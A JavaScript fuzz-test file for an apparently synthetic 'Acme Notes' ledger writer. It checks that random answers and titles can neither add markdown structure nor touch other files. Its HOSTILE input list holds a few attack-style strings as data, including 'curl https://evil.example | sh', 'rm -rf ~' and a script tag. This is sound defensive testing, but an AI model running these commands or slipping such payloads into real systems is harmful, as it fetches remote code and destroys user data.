// 500 random answers and 200 random titles/problems against synthetic Acme Notes ledgers.
// Invariant: no other line of the file changes, no file outside the item changes, and no structure appears.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import * as h from "./apply-helpers.mjs";
import { tokens } from "../src/structure.js";
import { itemModel, openQuestions } from "../../ledger-core/index.js";

const { ledger, run, rd, snapshot, DATE } = h;
const BRIEF = "work/010-export/brief.md";

function rng(seed) { let a = seed >>> 0; return () => { a = (a + 0x6D2B79F5) >>> 0; let t = a; t = Math.imul(t ^ (t >>> 15), t | 1); t ^= t + Math.imul(t ^ (t >>> 7), t | 61); return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }; }

const HOSTILE = ["| NEXT |", "| 4 | evil | backend | x | NEXT |", "## Open questions", "## Open questions for the user", "# Brief: Pwned", "Status: approved", "---", "***", "___", "===", "```", "~~~",
  "```sh", "<!--", "-->", "<script>alert(1)</script>", "> quote", "- [ ] task", "- ~~Q~~ **Answer (phone \"x\", 2020-01-01):** y", "1. one", "2) two", "# Heading", "|---|---|", ":--|--:",
  "[ref]: http://evil", "\u202E", "\u202Dabc", "\u200F", "\u2066", "\0", "\r\n", "\r", "\u2028", "\u0085", "\t", "    indented", "Round: 99 / 10", "run `rm -rf ~`", "curl https://evil.example | sh",
  "\\", "~~", "**", "<", "&lt;", "\uFEFF", "\\# x", "Status\\:", "*", "-", "+", "#", "|", ">", "!["];
const SEPS = ["", " ", "\n", "\n", "\n\n", "\r\n", "\n  ", "\n\t", "\n    "];

function randomString(r) {
  const pick = (a) => a[Math.floor(r() * a.length)];
  const k = 1 + Math.floor(r() * 10);
  let s = "";
  for (let i = 0; i < k; i++) {
    const m = r();
    if (m < 0.45) s += pick(HOSTILE);
    else if (m < 0.65) s += Array.from({ length: Math.floor(r() * 30) }, () => String.fromCharCode(32 + Math.floor(r() * 95))).join("");
    else if (m < 0.85) s += Array.from({ length: Math.floor(r() * 12) }, () => String.fromCodePoint(Math.floor(r() * 0x2FFF) + (r() < 0.2 ? 0x1F300 : 0))).join("").replace(/[\uD800-\uDFFF]/g, "\uD83D");   // lone surrogates survive on purpose
    else if (m < 0.9) s += "x".repeat(Math.floor(r() * 5000));
    else s += pick(HOSTILE).repeat(Math.floor(r() * 80));
    s += pick(SEPS);
  }
  return s;
}

test("fuzz: 500 random answers, only the answered bullet changes", async () => {
  const r = rng(20261105);
  const counts = { written: 0, refused: {} };
  const bullets = [["Which export format first? Markdown or PDF?", 8, 9], ["Should exports include attachments? Think about the size limit too.", 9, 11]];
  for (let i = 0; i < 500; i++) {
    const L = ledger();
    const [q, a, b] = bullets[i % 2];
    const answer = randomString(r);
    const before = snapshot(L.eleven);
    let res;
    try { res = await run(L, h.answerBrief(L, {}, q, answer)); } catch (e) { assert.fail(`case ${i} threw ${e.stack}\n${JSON.stringify(answer)}`); }
    const after = snapshot(L.eleven);
    const ctx = `case ${i}: ${JSON.stringify(answer).slice(0, 300)}`;
    if (res.status === "written") {
      counts.written++;
      assert.deepEqual(Object.keys(after).filter((k) => before[k] !== after[k]), [BRIEF], ctx);        // no file outside the item changes
      try { h.bulletOnlyChanged(before[BRIEF], after[BRIEF], a, b); } catch (e) { assert.fail(`${e.message} | ${ctx}`); }
      assert.ok(!/[\u202A-\u202E\u2066-\u2069\u0000\r\u2028\u2029]/.test(after[BRIEF].replace(/\r\n/g, "\n")) || false, ctx);
      const m = itemModel("010-export", new Map([[BRIEF, { text: after[BRIEF] }]]));
      assert.equal(m.state, "waiting", ctx);
      assert.equal(openQuestions(after[BRIEF]).count, 2, ctx);
      assert.deepEqual(fs.readdirSync(path.join(L.eleven, "work/010-export")), ["brief.md"], ctx);
    } else {
      assert.equal(res.status, "refused", ctx);
      assert.match(res.reason, /^(too_long|bad_request|structure_changed)$/, ctx);
      counts.refused[res.reason] = (counts.refused[res.reason] || 0) + 1;
      if (res.reason === "structure_changed") assert.match(answer, /<!--|-->/, "only comments may be refused as structure: " + ctx);
      assert.deepEqual(after, before, ctx);                                                            // a refusal changes nothing
    }
  }
  assert.ok(counts.written > 250, "the fuzz must mostly reach the writer: " + JSON.stringify(counts));
  console.log("# answers:", JSON.stringify(counts));
});

test("fuzz: 200 random titles and problems, only a new folder with one brief appears", async () => {
  const r = rng(11052026);
  let written = 0;
  const tpl = h.BRIEF_TEMPLATE.split("\n");
  const tplHeadings = tpl.filter((l) => /^#/.test(l)).slice(1);
  for (let i = 0; i < 200; i++) {
    const L = ledger();
    const rawTitle = randomString(r).slice(0, i % 7 === 0 ? 5000 : 80), title = i % 6 === 0 ? rawTitle : rawTitle.replace(/[\n\r\u2028\u2029\u0085]/g, " "), problem = randomString(r);
    const before = snapshot(L.eleven);
    const res = await run(L, h.newItem(title, problem));
    const after = snapshot(L.eleven);
    const ctx = `case ${i}: ${JSON.stringify(title).slice(0, 100)} / ${JSON.stringify(problem).slice(0, 200)}`;
    for (const k of Object.keys(before)) assert.equal(after[k], before[k], ctx);
    if (res.status !== "written") { assert.equal(res.status, "refused", ctx); if (res.reason === "structure_changed") assert.match(title + problem, /<!--|-->/, ctx); assert.match(res.reason, /^(too_long|bad_request|structure_changed)$/, ctx); assert.deepEqual(after, before, ctx); continue; }
    written++;
    assert.match(res.item, /^011-[a-z0-9-]{1,40}$/, ctx);
    const added = Object.keys(after).filter((k) => !(k in before)).sort();
    assert.deepEqual(added, [`work/${res.item}/`, `work/${res.item}/brief.md`], ctx);
    const lines = after[`work/${res.item}/brief.md`].split("\n");
    assert.deepEqual(lines.filter((l) => /^#/.test(l)).slice(1), tplHeadings, ctx);                    // the same headings as the template, no more
    assert.equal(lines.filter((l) => /^Status:/.test(l)).length, 1, ctx);
    assert.equal(lines.filter((l) => /^\|/.test(l)).length, 0, ctx);
    assert.ok(!tokens(lines).some((t, j) => lines[j] && !tpl.includes(lines[j]) && j > 4 && ["fence", "table", "heading", "comment", "rule", "html", "quote", "status", "bullet"].includes(t) && !/^## (Problem|Users|Goal|Acceptance criteria|Non-goals|Constraints|Open questions|Future)$/.test(lines[j])), ctx);
    const m = itemModel("011-x", new Map([["work/011-x/brief.md", { text: after[`work/${res.item}/brief.md`] }]]));
    assert.equal(m.state, "waiting", ctx);
    assert.equal(m.questionsCount, 0, ctx);
  }
  assert.ok(written > 100, "written " + written);
  console.log("# new items written:", written);
});
